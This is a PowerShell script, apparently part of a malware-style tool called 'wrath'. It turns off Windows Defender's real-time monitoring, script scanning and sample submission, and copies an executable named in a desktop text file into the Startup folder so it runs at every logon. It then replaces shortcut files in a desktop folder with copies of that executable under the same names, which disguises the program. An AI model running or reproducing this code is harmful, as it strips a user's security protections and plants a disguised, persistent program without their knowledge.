# Run a command
Write-Host "Shutting of windows defender..."
Invoke-Expression "Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend"


# Check if ps1prep.txt exists on the desktop
$ps1prepPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'ps1prep.txt')
if (-not (Test-Path $ps1prepPath)) {
    Write-Host "Error: wrath has not been ran yet" -ForegroundColor Red
    Write-Host "Script will exit."
    # Pause to keep the console window open
    Write-Host "Press any key to exit..."
    $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')
    exit
}

# Create a text file on the desktop
$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), 'ps1ran.txt')
Set-Content -Path $desktopPath -Value "This is the ps1 ran file."


# Read the file path from ps1prep.txt
$executablePath = Get-Content $ps1prepPath -Raw

# Duplicate the executable to the startup folder
$startupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
$duplicatedPath = [System.IO.Path]::Combine($startupFolder, [System.IO.Path]::GetFileName($executablePath))

Copy-Item -Path $executablePath -Destination $duplicatedPath -Force

Write-Host "Executable duplicated to: $duplicatedPath" -ForegroundColor Yellow

# Get the file path from ps1prep.txt
$ps1PrepFilePath = "C:\Users\jaysc\Desktop\ps1prep.txt"
$shortcutSourcePath = Get-Content -Path $ps1PrepFilePath

# Validate that the file path exists
if (Test-Path $shortcutSourcePath -PathType Leaf) {
    # Specify the folder on the desktop
    $desktopFolderPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Desktop'), "containedTesting Folder")

    # Create the folder if it doesn't exist
    if (-not (Test-Path $desktopFolderPath -PathType Container)) {
        New-Item -ItemType Directory -Path $desktopFolderPath | Out-Null
    }

    # Scan the folder for shortcuts
    $shortcuts = Get-ChildItem -Path $desktopFolderPath -Filter *.lnk

    # Process each shortcut
    foreach ($shortcut in $shortcuts) {
        # Get the name of the shortcut without the extension
        $shortcutName = [System.IO.Path]::GetFileNameWithoutExtension($shortcut.Name)

        # Delete the existing shortcut
        Remove-Item $shortcut.FullName -Force

        # Create a copy of the executable and place it in the folder
        $executableCopyPath = [System.IO.Path]::Combine($desktopFolderPath, "$shortcutName.exe")
        Copy-Item -Path $shortcutSourcePath -Destination $executableCopyPath -Force
    }

    Write-Host "Script completed successfully."
   

} else {
    Write-Host "Error: The specified file path in ps1prep.txt does not exist."
}
